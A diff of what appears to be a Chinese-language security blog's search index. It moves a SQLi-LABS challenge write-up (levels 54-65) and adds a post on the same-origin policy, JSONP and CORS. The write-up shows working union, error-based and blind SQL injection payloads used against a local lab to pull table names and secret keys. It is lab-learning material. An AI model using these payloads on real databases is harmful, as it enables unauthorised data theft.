@@ -257,99 +257,6 @@
       </tags>
   </entry>
   <entry>
-    <title>SQLi-LABS (Challenges) 54-65关</title>
-    <url>/2021/03/07/SQLi-LABS%20(Challenges)%2054-65%E5%85%B3/</url>
-    <content><![CDATA[<p>这一系列的关卡都有个限制，对我们之前所学的知识进行更深层次的运用。</p>
-<h2 id="Less-54"><a href="#Less-54" class="headerlink" title="Less-54"></a>Less-54</h2><p>这一关的数据库每10次查询后会自动重置随机生成新的表名和列名数据，需要我我们在10次尝试以内得出 secret key 。</p>
-<h3 id="联合注入"><a href="#联合注入" class="headerlink" title="联合注入"></a>联合注入</h3><p>这里再重新演示一次正常的联合注入流程</p>
-<ul>
-<li><strong>判断闭合方式和参数数据类型</strong></li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.91.134&#x2F;sqli-labs&#x2F;Less-54&#x2F;?id&#x3D;1	正常</span><br><span class="line">http:&#x2F;&#x2F;192.168.91.134&#x2F;sqli-labs&#x2F;Less-54&#x2F;?id&#x3D;1&#39;	没有返回</span><br></pre></td></tr></table></figure>
-<p>从这2步可以看出，这里是字符型的参数，并且闭合方式一定是<code>&#39;$id&#39;</code>或者<code>(&#39;$id&#39;)</code>两者之一。</p>
-<ul>
-<li><strong>判断字段数</strong></li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;1&#39; order by 3--+	正常</span><br><span class="line">?id&#x3D;1&#39; order by 4--+	没有返回</span><br></pre></td></tr></table></figure>
-<p>得出查询返回的字段数有3个</p>
-<ul>
-<li><strong>查询有可注入的字段</strong></li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;-1&#39; union select 1,2,3 --+</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210306152449878.png" alt="image-20210306152449878"></p>
-<p>可见字段2，3是可以显示出来的。</p>
-<ul>
-<li>查询表名</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;-1&#39; union select 1,2,(SELECT+GROUP_CONCAT(table_name+SEPARATOR+0x3c62723e)+FROM+INFORMATION_SCHEMA.TABLES+WHERE+TABLE_SCHEMA&#x3D;DATABASE()) --+</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210306152613507.png" alt="image-20210306152613507"></p>
-<p>可知表名为 ttyxbfpvca</p>
-<ul>
-<li>查询字段名</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;-1&#39; union select 1,2,(SELECT+GROUP_CONCAT(column_name+SEPARATOR+0x3c62723e)+FROM+INFORMATION_SCHEMA.COLUMNS+WHERE+TABLE_NAME&#x3D;&#39;ttyxbfpvca&#39;) --+</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210306152822385.png" alt="image-20210306152822385"></p>
-<p>查到有 id、sessid、secret_IVAU、tryy 这些字段</p>
-<ul>
-<li>查询数据</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;-1&#39; union select 1,2,(SELECT+GROUP_CONCAT(secret_IVAU)+FROM+ttyxbfpvca) --+</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210306153106710.png" alt="image-20210306153106710"></p>
-<p>拿到 secret key 值为：J1rzyGdPRiKwK5I4iaNlCwuT</p>
-<h2 id="Less-55"><a href="#Less-55" class="headerlink" title="Less-55"></a>Less-55</h2><p>这一关和 Less-54 基本一致，给了14次机会，闭合方式改为了<code>($id)</code></p>
-<h2 id="Less-56"><a href="#Less-56" class="headerlink" title="Less-56"></a>Less-56</h2><p>这一关和 Less-54 相比只是闭合方式换成了<code>(&#39;$id&#39;)</code>，给了14次机会。</p>
-<h2 id="Less-57"><a href="#Less-57" class="headerlink" title="Less-57"></a>Less-57</h2><p>这一关和 Less-54 基本一致，给了14次机会，闭合方式改为了<code>&quot;$id&quot;</code></p>
-<h2 id="Less-58"><a href="#Less-58" class="headerlink" title="Less-58"></a>Less-58</h2><p>这一关只给了5次机会，当然如果知道了要使用什么注入方法后也能绰绰有余</p>
-<ul>
-<li>查看代码</li>
-</ul>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$unames</span>=<span class="keyword">array</span>(<span class="string">&quot;Dumb&quot;</span>,<span class="string">&quot;Angelina&quot;</span>,<span class="string">&quot;Dummy&quot;</span>,<span class="string">&quot;secure&quot;</span>,<span class="string">&quot;stupid&quot;</span>,<span class="string">&quot;superman&quot;</span>,<span class="string">&quot;batman&quot;</span>,<span class="string">&quot;admin&quot;</span>,<span class="string">&quot;admin1&quot;</span>,<span class="string">&quot;admin2&quot;</span>,<span class="string">&quot;admin3&quot;</span>,<span class="string">&quot;dhakkan&quot;</span>,<span class="string">&quot;admin4&quot;</span>);</span><br><span class="line"><span class="variable">$pass</span> = (<span class="variable">$unames</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Your Login name : &#x27;</span>. <span class="variable">$unames</span>[<span class="variable">$row</span>[<span class="string">&#x27;id&#x27;</span>]];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Your Password : &#x27;</span> .<span class="variable">$pass</span>[<span class="variable">$row</span>[<span class="string">&#x27;id&#x27;</span>]];</span><br></pre></td></tr></table></figure>
-<p>这里查询成功只给你回显预定数组里面的数据，并不是直接回显查询结果，因此无法使用联合注入，我们可以尝试报错注入。</p>
-<h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><p>这里再演示一次报错注入：</p>
-<ul>
-<li>查询表名</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;-1&#39; and (select extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()),0x7e)))--+</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210306155346027.png" alt="image-20210306155346027"></p>
-<p>得知表名为：7dvdblb1tl</p>
-<ul>
-<li>查询字段名</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;-1&#39; and (select extractvalue(1,concat(0x7e,(select group_concat(column_name+SEPARATOR+0x3c62723e) from information_schema.columns where table_name&#x3D;&#39;7dvdblb1tl&#39;),0x7e)))--+</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210306155750151.png" alt="image-20210306155750151"></p>
-<p>由于报错注入回显的字符数有限，如果想要后面的信息，可以加 limit 来限制数量</p>
-<p>这我们已经可以知道想要的字段名为：secret_UPZ7</p>
-<ul>
-<li>查询数据</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;-1&#39; and (select extractvalue(1,concat(0x7e,(select secret_UPZ7 from 7dvdblb1tl),0x7e)))--+</span><br></pre></td></tr></table></figure>
-<p>得到 secret key 为： JrOfRpU234sYeim4AJuv6zVw</p>
-<h2 id="Less-59"><a href="#Less-59" class="headerlink" title="Less-59"></a>Less-59</h2><p>本关与 Less-58 的思路一样，只是参数的数据类型换成了数字型。</p>
-<h2 id="Less-60"><a href="#Less-60" class="headerlink" title="Less-60"></a>Less-60</h2><p>本关与 Less-58 的思路一样，只是闭合方式改为了<code>(&quot;$id&quot;)</code>。</p>
-<h2 id="Less-61"><a href="#Less-61" class="headerlink" title="Less-61"></a>Less-61</h2><p>本关与 Less-58 的思路一样，只是闭合方式改为了<code>((&#39;$id&#39;))</code>。</p>
-<h2 id="Less-62"><a href="#Less-62" class="headerlink" title="Less-62"></a>Less-62</h2><p>这一关把错误信息显示也屏蔽了，因此只能使用盲注了，由于盲注需要尝试的步骤也比较多，因此这里也给出了130次的机会。同时应该注意到这里的闭合方式为<code>(&#39;$id&#39;)</code></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.91.134&#x2F;sqli-labs&#x2F;Less-62&#x2F;index.php&#x2F;?id&#x3D;1&#39;) and (ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1) ,1,1))) &gt; 1--+</span><br></pre></td></tr></table></figure>
-<p>这里给出sqlmap的结果，注意如果已经运行过一次的话第二次需要清除缓存和cookie</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">--flush-session --fresh-queries</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210306172703280.png" alt="image-20210306172703280"></p>
-<h2 id="Less-63"><a href="#Less-63" class="headerlink" title="Less-63"></a>Less-63</h2><p>与 Less-62 注入方式一致，只是闭合方式为<code>&#39;$id&#39;</code></p>
-<h2 id="Less-64"><a href="#Less-64" class="headerlink" title="Less-64"></a>Less-64</h2><p>与 Less-62 注入方式一致，只是闭合方式为<code>(($id))</code></p>
-<h2 id="Less-65"><a href="#Less-65" class="headerlink" title="Less-65"></a>Less-65</h2><p>与 Less-62 注入方式一致，只是闭合方式为<code>(&quot;$di&quot;)</code></p>
-<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul>
-<li><a class="link"   href="https://www.sqlsec.com/2020/05/sqlilabs.html#toc-heading-44" >SQLI labs 靶场精简学习记录<i class="fas fa-external-link-alt"></i></a></li>
-</ul>
-<ul>
-<li><a class="link"   href="https://www.cnblogs.com/lcamry/" >lcamry 大佬的《MySQL注入天书》<i class="fas fa-external-link-alt"></i></a></li>
-</ul>
-]]></content>
-      <categories>
-        <category>CTF</category>
-      </categories>
-      <tags>
-        <tag>SQL注入</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>SQLI-LABS (Stacked Injections) 38-53关</title>
     <url>/2021/03/07/SQLI-LABS%20(Stacked%20Injections)%2038-53%E5%85%B3/</url>
     <content><![CDATA[<h2 id="Less-38"><a href="#Less-38" class="headerlink" title="Less-38"></a>Less-38</h2><ul>
@@ -455,6 +362,99 @@
 
 <h2 id="Less-52"><a href="#Less-52" class="headerlink" title="Less-52"></a>Less-52</h2><p>和 Less-50 是一样的，只是少了报错注入的利用方式。</p>
 <h2 id="Less-53"><a href="#Less-53" class="headerlink" title="Less-53"></a>Less-53</h2><p>和 Less-51 是一样的，只是少了报错注入的利用方式。</p>
+<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul>
+<li><a class="link"   href="https://www.sqlsec.com/2020/05/sqlilabs.html#toc-heading-44" >SQLI labs 靶场精简学习记录<i class="fas fa-external-link-alt"></i></a></li>
+</ul>
+<ul>
+<li><a class="link"   href="https://www.cnblogs.com/lcamry/" >lcamry 大佬的《MySQL注入天书》<i class="fas fa-external-link-alt"></i></a></li>
+</ul>
+]]></content>
+      <categories>
+        <category>CTF</category>
+      </categories>
+      <tags>
+        <tag>SQL注入</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>SQLi-LABS (Challenges) 54-65关</title>
+    <url>/2021/03/07/SQLi-LABS%20(Challenges)%2054-65%E5%85%B3/</url>
+    <content><![CDATA[<p>这一系列的关卡都有个限制，对我们之前所学的知识进行更深层次的运用。</p>
+<h2 id="Less-54"><a href="#Less-54" class="headerlink" title="Less-54"></a>Less-54</h2><p>这一关的数据库每10次查询后会自动重置随机生成新的表名和列名数据，需要我我们在10次尝试以内得出 secret key 。</p>
+<h3 id="联合注入"><a href="#联合注入" class="headerlink" title="联合注入"></a>联合注入</h3><p>这里再重新演示一次正常的联合注入流程</p>
+<ul>
+<li><strong>判断闭合方式和参数数据类型</strong></li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.91.134&#x2F;sqli-labs&#x2F;Less-54&#x2F;?id&#x3D;1	正常</span><br><span class="line">http:&#x2F;&#x2F;192.168.91.134&#x2F;sqli-labs&#x2F;Less-54&#x2F;?id&#x3D;1&#39;	没有返回</span><br></pre></td></tr></table></figure>
+<p>从这2步可以看出，这里是字符型的参数，并且闭合方式一定是<code>&#39;$id&#39;</code>或者<code>(&#39;$id&#39;)</code>两者之一。</p>
+<ul>
+<li><strong>判断字段数</strong></li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;1&#39; order by 3--+	正常</span><br><span class="line">?id&#x3D;1&#39; order by 4--+	没有返回</span><br></pre></td></tr></table></figure>
+<p>得出查询返回的字段数有3个</p>
+<ul>
+<li><strong>查询有可注入的字段</strong></li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;-1&#39; union select 1,2,3 --+</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210306152449878.png" alt="image-20210306152449878"></p>
+<p>可见字段2，3是可以显示出来的。</p>
+<ul>
+<li>查询表名</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;-1&#39; union select 1,2,(SELECT+GROUP_CONCAT(table_name+SEPARATOR+0x3c62723e)+FROM+INFORMATION_SCHEMA.TABLES+WHERE+TABLE_SCHEMA&#x3D;DATABASE()) --+</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210306152613507.png" alt="image-20210306152613507"></p>
+<p>可知表名为 ttyxbfpvca</p>
+<ul>
+<li>查询字段名</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;-1&#39; union select 1,2,(SELECT+GROUP_CONCAT(column_name+SEPARATOR+0x3c62723e)+FROM+INFORMATION_SCHEMA.COLUMNS+WHERE+TABLE_NAME&#x3D;&#39;ttyxbfpvca&#39;) --+</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210306152822385.png" alt="image-20210306152822385"></p>
+<p>查到有 id、sessid、secret_IVAU、tryy 这些字段</p>
+<ul>
+<li>查询数据</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;-1&#39; union select 1,2,(SELECT+GROUP_CONCAT(secret_IVAU)+FROM+ttyxbfpvca) --+</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210306153106710.png" alt="image-20210306153106710"></p>
+<p>拿到 secret key 值为：J1rzyGdPRiKwK5I4iaNlCwuT</p>
+<h2 id="Less-55"><a href="#Less-55" class="headerlink" title="Less-55"></a>Less-55</h2><p>这一关和 Less-54 基本一致，给了14次机会，闭合方式改为了<code>($id)</code></p>
+<h2 id="Less-56"><a href="#Less-56" class="headerlink" title="Less-56"></a>Less-56</h2><p>这一关和 Less-54 相比只是闭合方式换成了<code>(&#39;$id&#39;)</code>，给了14次机会。</p>
+<h2 id="Less-57"><a href="#Less-57" class="headerlink" title="Less-57"></a>Less-57</h2><p>这一关和 Less-54 基本一致，给了14次机会，闭合方式改为了<code>&quot;$id&quot;</code></p>
+<h2 id="Less-58"><a href="#Less-58" class="headerlink" title="Less-58"></a>Less-58</h2><p>这一关只给了5次机会，当然如果知道了要使用什么注入方法后也能绰绰有余</p>
+<ul>
+<li>查看代码</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$unames</span>=<span class="keyword">array</span>(<span class="string">&quot;Dumb&quot;</span>,<span class="string">&quot;Angelina&quot;</span>,<span class="string">&quot;Dummy&quot;</span>,<span class="string">&quot;secure&quot;</span>,<span class="string">&quot;stupid&quot;</span>,<span class="string">&quot;superman&quot;</span>,<span class="string">&quot;batman&quot;</span>,<span class="string">&quot;admin&quot;</span>,<span class="string">&quot;admin1&quot;</span>,<span class="string">&quot;admin2&quot;</span>,<span class="string">&quot;admin3&quot;</span>,<span class="string">&quot;dhakkan&quot;</span>,<span class="string">&quot;admin4&quot;</span>);</span><br><span class="line"><span class="variable">$pass</span> = (<span class="variable">$unames</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Your Login name : &#x27;</span>. <span class="variable">$unames</span>[<span class="variable">$row</span>[<span class="string">&#x27;id&#x27;</span>]];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Your Password : &#x27;</span> .<span class="variable">$pass</span>[<span class="variable">$row</span>[<span class="string">&#x27;id&#x27;</span>]];</span><br></pre></td></tr></table></figure>
+<p>这里查询成功只给你回显预定数组里面的数据，并不是直接回显查询结果，因此无法使用联合注入，我们可以尝试报错注入。</p>
+<h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><p>这里再演示一次报错注入：</p>
+<ul>
+<li>查询表名</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;-1&#39; and (select extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()),0x7e)))--+</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210306155346027.png" alt="image-20210306155346027"></p>
+<p>得知表名为：7dvdblb1tl</p>
+<ul>
+<li>查询字段名</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;-1&#39; and (select extractvalue(1,concat(0x7e,(select group_concat(column_name+SEPARATOR+0x3c62723e) from information_schema.columns where table_name&#x3D;&#39;7dvdblb1tl&#39;),0x7e)))--+</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210306155750151.png" alt="image-20210306155750151"></p>
+<p>由于报错注入回显的字符数有限，如果想要后面的信息，可以加 limit 来限制数量</p>
+<p>这我们已经可以知道想要的字段名为：secret_UPZ7</p>
+<ul>
+<li>查询数据</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;-1&#39; and (select extractvalue(1,concat(0x7e,(select secret_UPZ7 from 7dvdblb1tl),0x7e)))--+</span><br></pre></td></tr></table></figure>
+<p>得到 secret key 为： JrOfRpU234sYeim4AJuv6zVw</p>
+<h2 id="Less-59"><a href="#Less-59" class="headerlink" title="Less-59"></a>Less-59</h2><p>本关与 Less-58 的思路一样，只是参数的数据类型换成了数字型。</p>
+<h2 id="Less-60"><a href="#Less-60" class="headerlink" title="Less-60"></a>Less-60</h2><p>本关与 Less-58 的思路一样，只是闭合方式改为了<code>(&quot;$id&quot;)</code>。</p>
+<h2 id="Less-61"><a href="#Less-61" class="headerlink" title="Less-61"></a>Less-61</h2><p>本关与 Less-58 的思路一样，只是闭合方式改为了<code>((&#39;$id&#39;))</code>。</p>
+<h2 id="Less-62"><a href="#Less-62" class="headerlink" title="Less-62"></a>Less-62</h2><p>这一关把错误信息显示也屏蔽了，因此只能使用盲注了，由于盲注需要尝试的步骤也比较多，因此这里也给出了130次的机会。同时应该注意到这里的闭合方式为<code>(&#39;$id&#39;)</code></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.91.134&#x2F;sqli-labs&#x2F;Less-62&#x2F;index.php&#x2F;?id&#x3D;1&#39;) and (ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1) ,1,1))) &gt; 1--+</span><br></pre></td></tr></table></figure>
+<p>这里给出sqlmap的结果，注意如果已经运行过一次的话第二次需要清除缓存和cookie</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">--flush-session --fresh-queries</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210306172703280.png" alt="image-20210306172703280"></p>
+<h2 id="Less-63"><a href="#Less-63" class="headerlink" title="Less-63"></a>Less-63</h2><p>与 Less-62 注入方式一致，只是闭合方式为<code>&#39;$id&#39;</code></p>
+<h2 id="Less-64"><a href="#Less-64" class="headerlink" title="Less-64"></a>Less-64</h2><p>与 Less-62 注入方式一致，只是闭合方式为<code>(($id))</code></p>
+<h2 id="Less-65"><a href="#Less-65" class="headerlink" title="Less-65"></a>Less-65</h2><p>与 Less-62 注入方式一致，只是闭合方式为<code>(&quot;$di&quot;)</code></p>
 <h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul>
 <li><a class="link"   href="https://www.sqlsec.com/2020/05/sqlilabs.html#toc-heading-44" >SQLI labs 靶场精简学习记录<i class="fas fa-external-link-alt"></i></a></li>
 </ul>
@@ -721,6 +721,179 @@
       <categories>
         <category>杂谈</category>
       </categories>
+  </entry>
+  <entry>
+    <title>同源策略</title>
+    <url>/2021/03/13/%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5/</url>
+    <content><![CDATA[<h1 id="同源策略"><a href="#同源策略" class="headerlink" title="同源策略"></a>同源策略</h1><p><strong>同源策略</strong>是一个重要的安全策略，它用于限制一个<a class="link"   href="https://developer.mozilla.org/en-US/docs/Glossary/Origin" >origin<i class="fas fa-external-link-alt"></i></a>的文档或者它加载的脚本如何能与另一个源的资源进行交互。它能帮助阻隔恶意文档，减少可能被攻击的媒介。</p>
+<h2 id="源的定义"><a href="#源的定义" class="headerlink" title="源的定义"></a>源的定义</h2><p>如果两个URL拥有相同的<strong>协议（http、https）、端口和主机</strong>，那么这两个URL就是同源的。</p>
+<p>example：</p>
+<table>
+<thead>
+<tr>
+<th>URL</th>
+<th>是否同源</th>
+<th>原因</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><a class="link"   href="http://store.company.com/dir/page.html" >http://store.company.com/dir/page.html<i class="fas fa-external-link-alt"></i></a></td>
+<td>base</td>
+<td></td>
+</tr>
+<tr>
+<td><a class="link"   href="http://store.company.com/dir2/other.html" >http://store.company.com/dir2/other.html<i class="fas fa-external-link-alt"></i></a></td>
+<td>同源</td>
+<td>只有路径不同</td>
+</tr>
+<tr>
+<td><a class="link"   href="http://store.company.com/dir/inner/another.html" >http://store.company.com/dir/inner/another.html<i class="fas fa-external-link-alt"></i></a></td>
+<td>同源</td>
+<td>只有路径不同</td>
+</tr>
+<tr>
+<td><a class="link"   href="https://store.company.com/secure.html" >https://store.company.com/secure.html<i class="fas fa-external-link-alt"></i></a></td>
+<td>不同源</td>
+<td>协议不同</td>
+</tr>
+<tr>
+<td><a class="link"   href="http://store.company.com:81/dir/etc.html" >http://store.company.com:81/dir/etc.html<i class="fas fa-external-link-alt"></i></a></td>
+<td>不同源</td>
+<td>端口不同</td>
+</tr>
+<tr>
+<td><a class="link"   href="http://news.company.com/dir/other.html" >http://news.company.com/dir/other.html<i class="fas fa-external-link-alt"></i></a></td>
+<td>不同源</td>
+<td>主机不同</td>
+</tr>
+</tbody></table>
+<p>对于<code>about:blank</code>和<code>javascript:</code>这种特殊的 URL，他们的源应当是继承自加载他们的页面的源，他们本身并没有『源』的概念。</p>
+<h2 id="目的"><a href="#目的" class="headerlink" title="目的"></a>目的</h2><p>同源政策的目的，是为了保证用户信息的安全，防止恶意的网站窃取数据。</p>
+<p>设想这样一种情况：A网站是一家银行，用户登录以后，又去浏览其他网站。如果其他网站可以读取A网站的 Cookie，会发生什么？</p>
+<p>很显然，如果 Cookie 包含隐私（比如存款总额），这些信息就会泄漏。更可怕的是，Cookie 往往用来保存用户的登录状态，如果用户没有退出登录，其他网站就可以冒充用户，为所欲为。因为浏览器同时还规定，提交表单不受同源政策的限制。</p>
+<p>由此可见，”同源政策”是必需的，否则 Cookie 可以共享，互联网就毫无安全可言了。</p>
+<h3 id="限制范围"><a href="#限制范围" class="headerlink" title="限制范围"></a>限制范围</h3><p>同源策略限制非同源的三种行为：</p>
+<ul>
+<li><p>Cookie、LocalStorage 和 IndexDB 无法读取。</p>
+</li>
+<li><p>DOM 无法获得。</p>
+</li>
+<li><p>AJAX 请求不能发送。</p>
+</li>
+</ul>
+<h2 id="跨源访问"><a href="#跨源访问" class="headerlink" title="跨源访问"></a>跨源访问</h2><p>我们已经知道了，浏览器会根据同源策略允许或拒绝加载某些资源，但是又一个问题由此而生，我们的网站通常会将静态文件（<code>CSS</code>,<code>JS</code>, 图片）等放置在 CDN 上，那么 CDN 与当前域必然是不同源的，但是神奇的是，这些网站可以正常加载出他们需要的资源并展示给用户，这里为什么又不受同源策略的影响呢？</p>
+<p>同源策略控制不同源之间的交互，例如在使用<code>XMLHttpRequest</code> 或<code>&lt;img&gt;</code>标签时则会受到同源策略的约束。这些交互通常分为三类：</p>
+<ul>
+<li><p>跨域<strong>写操作</strong>（Cross-origin writes）一般是被允许的。例如链接（links），重定向以及表单提交。</p>
+</li>
+<li><p>跨域<strong>资源嵌入</strong>（Cross-origin embedding）一般是被允许。</p>
+</li>
+<li><p>跨域<strong>读操作</strong>（Cross-origin reads）一般是<strong>不被允许的</strong>，但常可以通过内嵌资源来巧妙的进行读取访问。</p>
+</li>
+</ul>
+<p>以下是可能嵌入跨源的资源的一些示例：</p>
+<ul>
+<li><code>&lt;script src=&quot;...&quot;&gt;&lt;/script&gt;</code> 标签嵌入跨域脚本。语法错误信息只能在同源脚本中捕捉到。</li>
+<li><code>&lt;link rel=&quot;stylesheet&quot; href=&quot;...&quot;&gt;</code> 标签嵌入CSS。由于CSS的松散的语法规则，CSS的跨域需要一个设置正确的Content-Type 消息头。</li>
+<li><code>&lt;img&gt;</code> / <code>&lt;video&gt;</code> / <code>&lt;audio&gt;</code> 嵌入多媒体资源。</li>
+<li><code>&lt;object&gt;</code> <code>&lt;embed&gt;</code> 和 <code>&lt;applet&gt;</code> 的插件。</li>
+<li><code>@font-face</code> 引入的字体。一些浏览器允许跨域字体( cross-origin fonts)，一些需要同源字体(same-origin fonts)。</li>
+<li><code>&lt;frame&gt;</code> 和 <code>&lt;iframe&gt;</code> 载入的任何资源。站点可以使用X-Frame-Options消息头来阻止这种形式的跨域交互。</li>
+</ul>
+<h3 id="1、具备src的标签"><a href="#1、具备src的标签" class="headerlink" title="1、具备src的标签"></a>1、具备src的标签</h3><ul>
+<li>原理：所有具有<code>src</code>属性的HTML标签都是可以跨域的</li>
+</ul>
+<p>在浏览器中，<code>&lt;script&gt;</code>、<code>&lt;img&gt;</code>、<code>&lt;iframe&gt;</code>和<code>&lt;link&gt;</code>这几个标签是可以加载跨域（非同源）的资源的，并且加载的方式其实相当于一次普通的GET请求，唯一不同的是，为了安全起见，浏览器不允许这种方式下对加载到的资源的读写操作，而只能使用标签本身应当具备的能力（比如脚本执行、样式应用等等）。</p>
+<h3 id="2、JSONP跨域"><a href="#2、JSONP跨域" class="headerlink" title="2、JSONP跨域"></a>2、JSONP跨域</h3><ul>
+<li>原理：<code>&lt;script&gt;</code>是可以跨域的，而且在跨域脚本中可以直接回调当前脚本的函数</li>
+</ul>
+<p><code>&lt;script&gt;</code>标签是可以加载异域的JavaScript并执行的，通过预先设定好的<strong>callback</strong>函数来实现和母页面的交互。它有一个大名，叫做JSONP跨域，JSONP是JSON with Padding的略称。它是一个非官方的协议，明明是加载script，为啥和JSON扯上关系呢？原来就是这个callback函数，对它的使用有一个典型的方式，就是通过JSON来传参，即将JSON数据填充进回调函数，这就是JSONP的JSON+Padding的含义。JSONP只支持GET请求。</p>
+<p>a网站的前端代码：</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span></span><br><span class="line"><span class="javascript">    <span class="function"><span class="keyword">function</span> <span class="title">dosomething</span>(<span class="params">jsondata</span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="comment">//处理获得的json数据</span></span></span><br><span class="line">    &#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;http://haorooms.com/data.php?callback=dosomething&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>b网站的后台代码：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$callback</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;callback&#x27;</span>];<span class="comment">//得到回调函数名</span></span><br><span class="line"><span class="variable">$data</span> = <span class="keyword">array</span>(<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;c&#x27;</span>);<span class="comment">//要返回的数据</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$callback</span>.<span class="string">&#x27;(&#x27;</span>.json_encode(<span class="variable">$data</span>).<span class="string">&#x27;)&#x27;</span>;<span class="comment">//输出</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>JSONP也存在一些安全问题，例如当对传入/传回参数没有做校验就直接执行返回的时候，会造成XSS问题。没有做Referer或Token校验就给出数据的时候，可能会造成数据泄露。</p>
+<h3 id="3、跨域资源共享（CORS）"><a href="#3、跨域资源共享（CORS）" class="headerlink" title="3、跨域资源共享（CORS）"></a>3、跨域资源共享（CORS）</h3><ul>
+<li>原理：服务器设置Access-Control-Allow-Origin HTTP响应头之后，浏览器将会允许跨域请求</li>
+</ul>
